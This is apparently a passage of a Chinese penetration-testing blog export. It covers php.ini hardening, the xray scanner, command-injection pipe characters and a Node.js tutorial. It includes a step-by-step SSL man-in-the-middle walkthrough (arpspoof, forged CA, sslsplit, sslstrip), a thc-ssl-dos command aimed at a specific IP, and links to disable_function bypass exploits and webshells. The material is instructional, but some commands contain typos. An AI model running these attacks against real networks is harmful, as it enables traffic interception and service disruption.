    <content type="text"><![CDATA[PHP.INI与WEB安全四种防护1.magic_quotes_gpc魔术引号：过滤转义四种字符（），对于sql注入有过滤作用 绕过： 特定条件下可以尝试宽字节注入 2.safe_mod 安全模式，官方自带的 安全模式： 禁止php中敏感函数，防御提权及后门调用，漏洞利用一些敏感函数被禁用 有时候不开安全模式的原因：自己开发中也需要使用到某些敏感函数，不然影响正常应用 3.open_basedir启用之后： open_basedir=D:\phpstudy\PHPTutorial\WWW`限制后门的访问指定目录（菜刀连上也看不到目录里面） 没办法绕过 4.disable_function可自定义禁用函数：安全模式(safe_mod)升级版，可自定义函数禁用，更加灵活 dl, exec, system, passthru, popen, proc_open, pcntl_exec, shell_exec, mail, imap_open, imap_mail, putenv, ini_set, apache_setenv, symlink, link 举例： disable_function = eval,system,fopen,fread,readdir,init_set //比如禁用某指定函数的做法 // 可以直接封杀大马小马等后门disable_functiondisable_function 绕过disable_function的突破: 方法1：蚁剑及插件(绕过disable_function)使用, 加载插件插件会保存到antData/plugin目录现在好像已经不用自己下载这个插件了 参考文章: https://www.cnblogs.com/linuxsec/articles/10966675.html 方法2： 针对php7.x:（不支持windows）https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php 方法3： 脚本集合：https://github.com/l3m0n/Bypass_Disable_functions_Shellhttp://webshell8.com/down/phpwebshell.zip 方法4：一些webshell自带绕过功能 其他目录权限文件解析 … … document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>php.ini</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xray简单学习]]></title>
    <url>%2Fposts%2F46596%2F</url>
    <content type="text"><![CDATA[xray学习平时使用webscan是最多的 结合基础爬虫 xray.exe webscan --basic-crawler http://xxxxx # 有弊端（爬虫是不受我们控制的。如果是代理就行了:我们点哪里就扫哪里） 基本使用代理原理 设置代理步骤 其中，证书的生成(只要程序位置不变，证书就不需要重新安装)：ca.crt, 然后安装证书 生成报告后(可以边扫边看)，点击对应条目，我们可以看到具体的请求/响应信息等 高级用法1.常用配置 配置文件：config.yaml 允许扫描的域 Mitm -&gt; Restriction默认会把所有流量扫描，可以指定我们想要扫描的域名的流量includes允许扫描的域，*表示任意；excludes不允许扫描的域 为代理添加认证 Mitm -&gt;auth如果把xray放到公网上，别人也可以使用，我们就需要设置账号密码 扫描插件配置 Plugins插件可以打开(enable:true)和关闭(false),也可以自定义字典等或者直接在命令行指定启用哪些插件：--plugins xss,xxe 发包速率限制 http -&gt; max_qps限制扫描速度，防止被waf拉黑 扫描代理配置 http -&gt; proxy代理支持以下形式 #1.http代理 http: proxy: "http://127.0.0.1:8080" # 漏洞扫描时使用的代理 #2.socks代理 http: proxy: "socks5://127.0.0.1:1111" # 漏洞扫描时使用的代理 log如果改成debug，可以看到具体发包请求详情： 也可以设置cookie 大致配置项： 2.xray与burp联动使用（1）Burpsuite作为xray的上游代理（抓取xray发包来学习） 作用：burp可以拿到xray的数据包（可以学习xray是如何检测的的） 设置方法： xray设置代理: http://127.0.0.1:8080 burp监听8080端口 启动xray，设置监听端口为--listen 127.0.0.1:1111 浏览器配置代理为1111 （2）xray作为Burpsuite的上游代理（协助测试） 作用：burp可以选择是否放行，forward之后，可以用xray进行扫描 设置方法： xray配置文件不配置代理 burp正常设置监听8080端口 burp打开user option -&gt; Upstream Proxy Server -&gt; 添加为:127.0.0.1:1111 浏览器设置burp代理8080 启动xray，设置监听端口为--listen 127.0.0.1:1111 其他方式：使用插件 使用xray编写自定义pocxray是用go语言开发的poc是yaml格式的 原理 每个规则都是http请求，进行改造 POC构成 name rules：最关键部分。请求方法,路径,表达式(有唯一的返回值)。支持多条(就会发送几条数据包) details：漏洞检测成功之后，输出一些提示信息 具体操作 看官方文档 vscode和jetBrain都行 vscode安装YAML查看，配置文件setting.json用来校验 按照上面的格式编写 运行：xray.exe webscan --plugins phantasm --poc ./poc-yaml-test.yml --listen 127.0.0.1:1111 对单个url扫描：--url http://www.test.com 更好用 Note: phantasm这里是在命令行启用 详细内容查看官方文档 调试poc的方法：设置上游代理为burp，在burp查看xray发送的数据包 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>xray</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的管道符]]></title>
    <url>%2Fposts%2F62311%2F</url>
    <content type="text"><![CDATA[常见的管道符：Windows：| 直接执行后面的语句|| 如果前面出错（即为false），就执行后面的语句（前面只能为假）&amp; 如果前面的语句为假则直接执行后面的语句（前面可真可假）&amp;&amp; 如果前面的语句为假，则直接出错，且不执行后面的语句（前面只能为真） Linux：; 执行完前面再执行后面| 显示后面语句的执行结果|| 前面语句出错时，执行后面的语句&amp; 如果前面的语句为假则直接执行后面的语句（前面可真可假）&amp;&amp; 如果前面的语句为假，则直接出错，且不执行后面的语句（前面只能为真） 命令执行简介程序如果提供执行 命令的功能比如提供了ping的功能： 输入 ping | dir, 利用了管道符执行了dir php中常见的执行系统 命令的函数： system, exec, shell_exec, passthru, popen, proc_popen 修复建议 尽量不要使用系统命令执行函数 对客户端提交的变量进行过滤和检测 使用动态函数之前，确保使用的函数是置顶的函数之一 对php来说，不能完全控制的危险函数最好不要使用 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>常见的管道符</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTPS攻击]]></title>
    <url>%2Fposts%2F33956%2F</url>
    <content type="text"><![CDATA[HTTPS攻击防止恶意注入、DNS劫持 https的作用 C I A 解决的是信息传输过程中数据被篡改、窃取 加密：对称、非对称、单向(Hash) https攻击方法 降级攻击 解密攻击（明文、证书伪造）– 劫持 协议漏洞、实现方法的漏洞、配置不严格 常识SSL（安全套接层, Secure socket layer）,后来使用TSL取代了SSL，只不过习惯了叫SSL SSL/TLS也被用于其他场景的传输通道加密： 邮件传输（服务器间、客户端与服务器间） 数据库服务器间 LDAP身份认证服务器间 SSL VPN 远程桌面RDP通信过程中的加密和身份认证 Web通信中SSL加密 公钥证书（受信任的第三方证书颁发机构签名颁发） 常见的证书颁发机构：VeriSign、Thawte、GlobalSign、Symantec 加密过程：握手、协商加密算法、获取公钥证书、交换会话秘钥、加密信息传输 非对称加密算法 非对称加密一般用来加密比较小的数据例如：RSA, ECC等 对称加密算法 DES/3DES, AES, IDEA, RC4 …… 单向加密算法(Hash) Hash算法 Hash值长度(bit) MD5 128 SHA-1 160 SHA-2 224,256,384,512 SSL的弱点 SSL是不同的对称、非对称、单项加密算法的组合加密实现(cipher suite) 服务器端为提供更好的兼容性，选择支持大量过时cipher suite 协商过程中墙皮降级加密强度 现代处理器计算能力可以在可接受的时间内破解过时加密算法 购买云计算资源破解 实践 查看web站点用了啥样的ssl协议，什么版本，什么组合 1.openssl命令openssl s_client --connect www.baidu.com:443 #证书颁发机构也是树形结构的，有一级二级 #指定查看是否支持某协议和组合 openssl s_client -tls1_2 -cipher 'ECDHE-ECDSA-AES128-GCM-SHA256' -connect www.taobao.com:443 # 测试是否可以跟已知的不安全的cipher suite建立连接 openssl s_client -tls1_2 -cipher 'NULL,EXPORT,LOW,DES' -connect www.taobao.com:443 # 已知的不安全的组合cipher suite openssl ciphers -v 'NULL,EXPORT,LOW,DES' # 参考网站（加密技术） https://www.openssl.org/docs/apps/ciphers.html Openssl需要大量密码学相关知识，命令复杂，结果可读性差 2.SSLScan工具 自动识别ssl配置错误、过期协议、过时cipher suite和hash算法 默认会检查CRIME、心脏出血漏洞 绿色表示安全，红色黄色需要引起注意 查看TLS支持的cipher suite # 检查所有的支持的tls是否有不安全的 sslscan --tlsall www.taobao.com:443 # Altnames选项下面的域名也可以使用上面域名的证书 分析证书详细信息 sslscan --show-certificate -no-ciphersuites www.taobao.com:443 3.SSLyze工具 Python编写 检查ssl过时版本 检查存在弱点的cipher suite 扫描多站点时，支持来源文件(多个站点放到一个文件里面) 检查是否支持会话恢复 sslyze --regular www.supercomputerboytony.cn 4.Nmap# 枚举cipher suite nmap --script=ssl-enum-ciphers.nse www.supercomputerboytony.cn 5. 在线网站：输入域名，对SSL进行检测https://www.ssllabs.com/ssltest SSL中间人攻击概述攻击者位于客户端和服务器通信链路中 1.ARP欺骗（最常用） 2.DHCP如果有另一台机器，比之前的dhcp服务器离用户更近，那么攻击者的机器就会更快响应(DHCP第一步是广播) 3.修改网关 4.修改DNS(如果控制了客户机, 直接修改客户机的dns配置) 5.修改HOSTS 6.ICMP、STP(二层的生成树协议)、OSPF(三层的开放式最短路径优先协议) —&gt;如果处在同一局域网 不仅是http和tcp/ip协议容易出现安全问题，底层的网络协议也存在很多问题，自己搭建环境练习 加密流量 ps：下来的演示，是基于ARP欺骗的： 利用攻击的前提 客户端已经信任了伪造证书颁发机构 攻击者控制了核发证书颁发机构（CA证书服务器） 客户端程序禁止了显示证书错误告警信息 攻击者已经控制客户端，并强制其信任伪造证书 工具对已经实现中间人欺骗(这里用arpspoof)后，下面的工具对信息进行解密 1.SSLsplit工具 透明SSL/TLS中间人攻击工具 对客户端伪装成服务器，对服务器伪装成普通客户端 伪装服务器需要伪造证书（利用openssl来生成伪造的证书） 支持ssl/tls加密的smtp、pop3、ftp等通信中间人攻击 1). openssl # 1.利用openssl生成证书私钥 openssl genrsa -out ca.key 2048 # 2.利用私钥签名生成证书(生效时间,使用的私钥文件) -- 这是根证书，不是一会使用的证书，用的证书是需要这个根证书来签名的 openssl req -new -x509 -days 1096 -key ca.key -out ca.crt # 下来输入一些信息即可（信息可以把之前扫描的信息添进来以保证看起来很真实） 2).攻击机器设置路由转发下面，当受害者的流量通过我的机器，我的机器来转发（需要我的系统来开启路由功能）： 做个地址转换, 比如: 把我计算机443端口收到的数据包转发到8443端口 # 先查看要用到的端口有没有被占用 netstst -pantu |grep :80 # 查看nat表 iptables -t nat -L # -F 清空 iptables -t nat -F # 端口转发命令（PREROUTING在路由之前,-p协议, -j操作） iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIFECT --to-port 8080 iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIFECT --to-port 8443 iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIFECT --to-port 8443 # MSA iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIFECT --to-port 8443 # SMTPS 发邮件 iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIFECT --to-port 8443 # IMAPS 收邮件 iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIFECT --to-port 8443 #POP3S #其他使用ssl协议加密的协议端口一样 iptables -L 3).ARP欺骗 # -i本地网卡 -t要欺骗的目标， -r:让他认为网关192.168.1.1的mac地址是我本机的mac地址 arpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1 #可以发现：受害者机器上关于网关的mac已经换成了kali的 4).启动SSLsplit mkdir -p test/logdir # -D:debug显示详细信息，-l把连接信息记录到哪，-j“越狱”的根目录(sslsplit的)，-S请求具体数据内容保存的目录，-k私钥，-c证书；对ssl加密的在本地8443监听,对明文在本地8080监听 sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 # 所有操作完成了 然后让被害者访问https的一些网站(会显示证书有问题,是否继续浏览) 我们可以查看日志和浏览器证书以及证书保存信息(cat connect.log) , 具体通信数据在:ls test/logdir, 每个log文件中内容会有被解密的明文信息（如果还有加密信息,那就是应用程序本身进行了加密的，这里的解密的只是通信过程中针对ssl部分）通过关键词查找内容：grep xxx *.log这样 在受害者机器上安装我们生成的服务器根证书之后再次访问(浏览器就不会弹出警告了) 全站https/非全站https（比如只是登录等部分页面加了https） 2.Mitmproxy工具 设置路由表转发规则 # bug: 只能在8080端口监听，所以需要修改规则 iptables -t nat -F iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIFECT --to-port 8080 iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIFECT --to-port 8080 也是使用arpspoof进行arp欺骗 arpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1 最后，Mitmproxy侦听 mitmproxy -T --host -w mitmproxy.log # mitmproxy会自动生成一个证书 3.SSLstrip工具与前两种工具不同，此工具将客户端到中间人之间的流量变为明文(不用通过安装证书) # 这种更实用便捷，但是...... sslstrip -l 8080 SSL/TLS拒绝服务攻击 和流量式的拒绝服务攻击不同(打击的是网络带宽)，而我们这里打击的是服务器的资源 Note: SSL协商加密，服务器资源加载速度会变慢（大量握手请求会导致拒绝服务），但是优化得当就可以没问题 利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载 与流量式的拒绝服务攻击不同，thc-ssl-dos可利用dsl线路打垮30G带宽的服务器 服务器平均可以处理300次/s SSL握手请求 利用thc-ssl-dos工具#使用 thc-ssl-dos 199.223.209.205 2083 -accept dig命令，解析ip地址 补充概念AjaxAsynchronous JavaScript and XML 是一组现有技术的组合 通过客户端脚本动态更新页面部分内容，而非整个页面 降低带宽使用，提高速度 提升用户体验 后台异步访问 Ajax组件 JavaScript(ajax的核心组件) Dynamic HTML(DHTML) DOM ajax框架： jQuery Dojo Tookit Google Web toolkit Microsoft Ajax library 基于Ajax的Web应用工作流程 使用的技术混合越多，攻击面就越大(每个参数都可能形成独立的攻击过程) Ajax的安全问题 多种技术混合，攻击面就越大(每个参数都可能形成独立的攻击过程) Ajax引擎，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可能被绕过 服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露 暴露应用程序逻辑 Ajax对渗透测试的挑战 异步请求数量多且隐蔽 触发Ajax请求的条件无规律 手动和阶段大力爬网可能产生大量遗漏 检查方法： 手动查看页面源代码有没有使用ajax（效率低一些） 浏览器打开审查元素：net –&gt; XHR / net –&gt; javascript 使用ZAP，使用ajax爬站功能 Web Service 面向服务的架构，便于不同系统集成共享数据和功能 尤其适合不想暴露数据模型和程序逻辑而访问数据的场景 无页面 两种类型： SOAP （传统，xml是唯一的数据交换格式，繁琐，但是安全） – Simple object access protocol RESTful (json是首选的数据交换格式刷) web service安全考虑： 使用API key或session token实现和跟踪身份认证 身份认证由服务器完成，而非客户端 API key, 用户名, Session token 永远不要通过URL发送 RESTful 不提供任何安全机制，需要使用SSL/TLS保护传输数据安全 SOAP提供强于HTTPS的WS-security机制 使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的秘钥加密API key RESTful应只允许身份认证用户使用PUT、DELETE方法 使用所及token防止CSRF攻击 对用户提交参数过滤，建议部署基于严格白名单的方法 报错信息消毒 直接对象引用应严格身份验证(电商公司以ID作为主索引) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>HTTPS攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node.js 入门]]></title>
    <url>%2Fposts%2F2238%2F</url>
    <content type="text"><![CDATA[Node.js是一个机遇Chrome V8引擎的JavaScript运行环境 Node.js的包管理器npm，是全球最大的开源生态库系统 Node.js可解析js代码，没有浏览器安全级别的限制 一.开发环境配置官网： https://nodejs.org/en/ API文档：http://nodejs.cn/api/events.html 如果需要安装多个版本1).docker 2).使用nvm来安装并维护（推荐） 项目地址：https://github.com/nvm-sh/nvm # 1.安装nvm curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash # 2.配置环境变量 #linux下 .bash_profile或.bash_rc export NVM_DIR="$([ -z "${XDG_CONFIG_HOME-}" ] &amp;&amp; printf %s "${HOME}/.nvm" || printf %s "${XDG_CONFIG_HOME}/nvm")" [ -s "$NVM_DIR/nvm.sh" ] &amp;&amp; \. "$NVM_DIR/nvm.sh" # This loads nvm # windows系统。。。 3.配置加速镜像： # 同样在上面的配置文件 export NVM_NODEJS_ORG_MIRROR=http://npm.taobao.org/mirrors/node 安装node# 安装指定版本 nvm install 8.0.0 # 或安装最新的稳定版本 nvm install --lts # 或安装最新的版本 nvm install node # 查看安装的版本 nvm ls # 查看当前版本 node -v # 切换版本 nvm use 6.11.2 体验一下在终端进入node命令行：node, 之后可以输入js代码了 在终端里面，不用受到浏览器里面的一些限制(但是本地环境没有dom和bom的操作) 比如，查看本地进程process 执行文件：node index.js 不用每次写完都运行命令来执行安装nodemon, 实时侦测文件的变化 npm install nodemon -g # 全局安装 npm使用国内源： # 永久 npm config set registry https://registry.npm.taobao.org 或安装使用cnpm命令 使用nodemon： nodemon index.js # 这样就可以实时侦测了 使用其他版本node来运行脚本 # 1.指定版本来运行 nvm run 6.1.2 index.js #2.使用配置文件 .nvmrc #内容直接写版本号， 6.1.2 # nmp use #接下来运行就可以了 node index.js 二. 模块(包)与CommonJS Node.js三种模块 内置的Node.js模块 const os = require('os') // require 载入模块 console.log(os.hostname()); // 显示主机名 第三方的Node.js模块(https://www.npmjs.com) ​ 把包用npm引进来（可以创建配置文件来管理npm init,根据情况填写回撤，会自动创建package.json） ​ 在命令行输入npm install request --save 安装在配置信息的依赖dependencies里 ​ 会在我们的包里面自动创建一个文件夹node_modules, 我们安装的包就会在里面了 ​ 载入模块同上 ​ 然后开始使用第三方模块 const request = require('request') //自动先从自己的模块找，找不到就会到我们目录下配置文件夹下找 request({ url: 'https://api.douban.com/v2/movies/top250', json:true, }, (error, response, body) => { console.log(JSON.stringfy(body, null, 2)); }); 自定义的Node.js模块（要按照CommonJS规范） 新建一个目录src,里面新建一个js文件(模块) //自定义模块 const hello = () =>{ console.log("hello~"); } //暴露接口供外部使用(第一个hello是模块的名字，第二个hello是要用的方法) module.exports.hello = hello 调用 const greet = require("./src/greeting.js") greet.hello() 三. NPM-包管理工具npm使用npm -v npm info 镜像源 # 查看 npm config get registry # 设置 npm config set registry http://registry.npmjs.org 升级node # npm install n -g 查看当前目录下安装了哪些node包 npm ls 查看当前npm用户 npm whoami npm清理缓存 npm cache clean -f npm安装模块 # i = install npm i forever -g # 全局 npm install xxx # 利用 npm 安装xxx模块到当前命令行所在目录； npm install -g xxx # 利用npm安装全局模块xxx； npm install xxx # 安装但不写入package.json； npm install xxx –save # 安装并写入package.json的”dependencies”中； npm install xxx –save-dev # 安装并写入package.json的”devDependencies”中。 npm 删除模块 npm uninstall xxx # 删除xxx模块； npm uninstall -g xxx # 删除全局模块xxx； 更新模块 npm update 检查模块是否已经过时 npm outdated 在项目中引导创建一个package.json文件 npm init 发布模块 npm publish 查看node安装路径 查看node安装路径 npm scripts 配置文件中 "scripts": { "test": "echo \"Error: no test sspecified\" &amp;&amp; exit 1" "build": "node async.js" }, 按照上面配置完之后，运行只需：npm run build 优点： 功能相同，可以使用同一个脚本 详细的下来查文档 四.深入浅出Node核心模块API1). url 记得要导入模块 1.parseurl.parse(urlStr, [parseQueryString], [slashesDenoteHost]) url.parse("https://www.baidu.com") # 井号后面是hash url.parse("https://www.baidu.com:8080/api.php?from=xp&amp;course=node#level") #第二个参数 parseQueryString 为true时将使用查询模块分析查询字符串，默认为false url.parse("https://www.baidu.com"， true) #第三个参数 如果设置成true，//foo/bar 形式的字符串将被解释成 { host: ‘foo', pathname: ‘/bar' } url.parse("https://www.baidu.com"， true,true) 2.format将一个解析后的URL对象、转成、一个格式化的URL字符串。 url.format(urlObj) var url = require('url'); var a = url.format({ protocol : 'http' , auth : null , host : 'example.com:8080' , port : '8080' , hostname : 'example.com' , hash : null , search : '?a=index&amp;t=article&amp;m=default', query : 'a=index&amp;t=article&amp;m=default', pathname : '/one', path : '/one?a=index&amp;t=article&amp;m=default', href : 'http://example.com:8080/one?a=index&amp;t=article&amp;m=default' }); console.log(a); //输出结果：http://example.com:8080/one?a=index&amp;t=article&amp;m=default 3.resolve为URL或 href 插入 或 替换原有的标签，两段解析成一个完整的url url.resolve(from, to) var url = require('url'); var a = url.resolve('/one/two/three', 'four') , b = url.resolve('http://example.com/', '/one'), c = url.resolve('http://example.com/one', '/two'); console.log(a +","+ b +","+ c); //输出结果： ///one/two/four //http://example.com/one //http://example.com/two 2). QueryString1.querystring.escape(str)转义为url编码 querystring.escape('&lt;大家好>') 2.querystring.unescape(str)反转义 querystring.unescape('%3C%E5%A4%A7%E5%AE%B6%E5%A5%BD%3E') 3.querystring.stringify(obj,[, seq[, eq[, options]]])序列化 1. querystring.stringify({name:'chenshuai',ago:21,job:"web"}) 2. querystring.stringify({name:'chenshuai',ago:21,job:"web"},".") //第二个参数可以修改连接的&amp; 3. querystring.stringify({name:'chenshuai',ago:21,job:"web"},".",":")//第三个参数可以修改key与value之间的字符串 4.querystring.parse(str[, sep[, eq[, options]]])反序列化 // querystring.parse('字符串','&amp;','=') //默认状态(字符串,分隔符,键与值) 1. querystring.parse('name=chenshuai&amp;ago=21&amp;job=web') 2.querystring.parse('name=chenshuai.ago=21.job=web','.')//返序列化时要注意格式 3.querystring.parse('name:chenshuai.ago:21.job:web','.',':') 3).http(s) 模块1.get方法案例，http小爬虫 var http = require('http') var https = require('https') //https网站使用(和http的方法是一样的) var cherio = require('cherio') // 类似于jQuery var url = "https://www.lagou.com" // 解析源代码 function parseMenu(html){ //先导入html，然后再进行处理 var $ = cherio.load(html) var menu = $('.category-list') var menuData = [] menu.each(function(index,value){ //遍历 var menuTitle = $(value).find('h2').text() //一级标题 var menuLists = $(value).find('a') var menuList = [] menuLists.each(function(inde, val){ //遍历 menuList.push($(val).text()) //a元素的text }) menuData.push({ menuTitle:menuTitle, menuList:menuList }) }) return menuData } //打印 function printMenu(menu) { menu.forEach(function(val){ console.log(val.menuTitle + '\n'); val.menuList.forEach(function(value){ console.log(value); }) }) } // get请求 https.get(url, function(res){ var html = ''; res.on('data', function(data){ html += data; }) res.on('end', function(){ // 打印的是网页源代码 //console.log(html); var result = parseMenu(html) printMenu(result) }) res.on('error', function(err){ console.log(err); }) }) 2.Request方法GET获取异步数据 //Http模块的request方法的get来获取异步数据 豆瓣电影Top250 const https = require('https') var options = { hostname: 'douban.uieee.com', port: 443, method: 'GET', path: '/v2/movie/top250' } var responseData = '' var request = https.request(options, (response) =>{ response.setEncoding('utf8') response.on('data', (chunk)=>{ responseData += chunk }) response.on('end',()=>{ JSON.parse(responseData).subjects.map((item) =>{ console.log(item.title); // 第一页的电影标题 }) }) }) request.on('error', (error)=>{ console.log(error); }) request.end() POST方法提交表单 //Http模块的request方法的post方法提交表单 const http = require('http') const qs = require('querystring') //序列化 var postData = querystring.stringfy({ 'question[title]':'哈哈哈', 'question[content]':'我的内容' }) var options = { hostname: 'www.codingke.com', port: 80, method: 'POST', path: '/ajax/course/question' headers: { // 因为登录之后才能提交，所有这里... 'Cookie':'xxxx', 'User-Agent':'xxxx', 'xxx':'xxx', 'Content-Length':postData.length } } var request = http.request(options, (res) =>{ console.log('Status:' + res.statusCode); res.setEncoding('utf8') res.on('data', (chunk)=>{ console.log(chunk); }) res.on('end',()=>{ console.log("表单提交完毕"); }) }) //提交表单 request.write(postData) request.on('error', (error)=>{ console.log(error); }) request.end() 4). Events事件模块使用事件: EventEmitter类 事件的参数 只执行一个的事件监听器 比如：更新、发布 都是一个事件 小例子: const EventEmitter = require('events') class Player extends EventEmitter{} //继承类 //实例化对象 var player = new Player() //自定义一个函数(不过我这里是用的匿名函数) function ev1(){ console.log("嘻嘻"); } //监听事件(这里用的匿名函数) player.on('play', (track)=>{ console.log(`正在播放: 《${track}》`); }) // emit订阅事件，传递参数 player.emit('play',"被风吹过的夏天") //事件定义之后，可以多次触发 player.emit('play',"朋友请听好") // once 不论你定义几次，只会触发一次 player.once('play',"陈情令") // removeListener 移除指定的监听事件 //player.removeListener('') // removeAllListeners 移除所有的监听事件 // eventNames方法可以罗列出已注册的所有监听器的事件，类型为数组 5). fs 文件系统得到文件与目录信息：stat 创建一个目录：mkdir 创建文件并写入内容：writeFile,appendFile 读取文件的内容：readFile 列出目录的东西：readdir 重命名目录或文件：rename 删除目录与文件：rndir,unlink const fs = require('fs') fs.stat('index.js', (error,stats) => { if(error){ console.log(error); }else{ console.log(stats); //打印文件的一些信息 console.log(`文件：${stats.isFile()}`); console.log(`目录：${stats.isDirectory()}`); } }) //新建目录 fs.mkdir('logs' (error) =>{ if(error){ console.log(error); }else{ console.log("成功创建目录: logs"); } }) // 往文件写内容(如果文件不存在，就先创建) fs.writeFile('logs/hello.log', "hello ~\n" , (error) =>{ if(error){ console.log(error); }else{ console.log("成功向文件logs/hello.log写入内容 "); } }) // 修改文件内容 fs.writeFile('logs/hello.log', "你好 ~\n" , (error) =>{ if(error){ console.log(error); }else{ console.log("成功修改文件logs/hello.log内容 "); } }) // 追加文件内容 fs.appendFile('logs/hello.log', "新添加的一行 ~\n" , (error) =>{ if(error){ console.log(error); }else{ console.log("成功添加内容文件logs/hello.log "); } }) // 读取文件内容 fs.readdFile('logs/hello.log','utf8', (error,data) =>{ if(error){ console.log(error); }else{ console.log("成功读取文件logs/hello.log内容"); console.log(data); //console.log(data.toString()); } }) // 读取文件夹列表 fs.readdir('logs/', (error,data) =>{ if(error){ console.log(error); }else{ console.log("成功读取文件夹logs/列表 "); console.log(data); //console.log(data.toString()); } }) //对文件重命名 、修改文件夹名字一样 fs.rename('logs/hello.log', "logs/hello_new.log" , (error) =>{ if(error){ console.log(error); }else{ console.log('重命名文件名logs/hello.log "); } }) //循环删除文件 fs.readdirSync('logs').map((file) =>{ fs.unlink(`logs/${file}`, (error) =>{ if(error){ console.log(error); }else{ console.log(`成功删除文件logs/${file}`); } }) }) //删除文件夹 fs.rmdir('logs', (error) =>{ if(error){ console.log(error); }else{ console.log('成功删除目录:logs/ "); } }) 6). Stream文件流 const fs = require('fs') var fileReadStrem = fs.createReadStream('data.json') var fileWriteStrem = fs.createWriteStream('data1.json') var count = 0; //读取文件流 fileReadStrem.once('data', (chunk) => { console.log(chunk.toString()); }) fileReadStrem.on('data', (chunk) => { console.log(`${ ++count } 接收到：${chunk.length}`); //写入文件流 fileWriteStrem.write(chunk) }) fileReadStrem.on('end', () => { console.log("-- 结束 --"); }) fileReadStrem.on('error', (error) => { console.log(error); }) pipe const fs = require('fs') const zlib = require('zlib') var fileReadStrem = fs.createReadStream('data.json') var fileWriteStrem = fs.createWriteStream('data1.json') fileWriteStrem.on('pipe', (source) => { console.log(source); //将写入的内容通过管道打印一下 }) //读取文件流的内容放到文件写入流 管道 fileReadStrem .pipe(zlib.createGzib()) .pipe(fileWriteStrem) 五.使用Node创建后端路由使用supervisor运行 # 安装： npm install supervisor -g # 运行 supervisor router_1.js 最简单路由 router_1.js var http = require('http') var url = require('url') var route = require('./modules/route.js') http.createServer((req, res) => { res.writeHead(200, {'Content-Type':'text/html;charset=utf-8'}) if(req.url !== '/favicon.ico'){ var pathName = url.parse(req.url).pathname.replace(/\//,'') //http://localhost:8000/login就是login console.log(pathName); try{ //最简单的异常处理 route[pathName](req, res) } catch(err){ route['home'](req, res) //默认路由，如果不存在哪个路由，就返回这个路由 } } res.end() }).listen(8000) console.log('Server running at http://localhost:8000'); route.js module.exports = { home: (req, res) => { res.write("欢迎来到首页") // 默认路由 }, login: (req, res) => { res.write("登录界面") // 处理路由 }, registor: (req, res) => { res.write("注册界面") // 处理路由 } } 读取图片 router_02.js var http = require('http') var url = require('url') var route = require('./modules/route.js') http.createServer((req, res) => { res.writeHead(200, {'Content-Type':'image/jpeg'}) if(req.url !== '/favicon.ico'){ var pathName = url.parse(req.url).pathname.replace(/\//,'') //http://localhost:8000/login就是login console.log(pathName); try{ //最简单的异常处理 route[pathName](req, res) } catch(err){ route['home'](req, res) //默认路由，如果不存在哪个路由，就返回这个路由 } } //res.end() }).listen(8000) console.log('Server running at http://localhost:8000'); route.js var file = require('./file.js') module.exports = { home: (req, res) => { res.write("欢迎来到首页") // 默认路由 }, login: (req, res) => { res.write("登录界面") // 处理路由 }, registor: (req, res) => { res.write("注册界面") // 处理路由 }, img: (req, res) => { //读取文件，也新建一个模块 file.readImg('./images/1.jpg', res) } } file.js var fs = require('fs') module.exports = { readImg: (file, res) => { fs.readFile(file, 'binary', (err, data) => { if(err) throw err; res.writeHead(200, {'Content-Type':'image/jpeg'}) res.write(data, 'binary') res.end() }) } } 文字和图片一起显示 使用html文件 views/home.html &lt;!&lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset="utf-8"> &lt;title>首页&lt;/title> &lt;/head> &lt;body> 首页 &lt;img src="./img" alt=""> 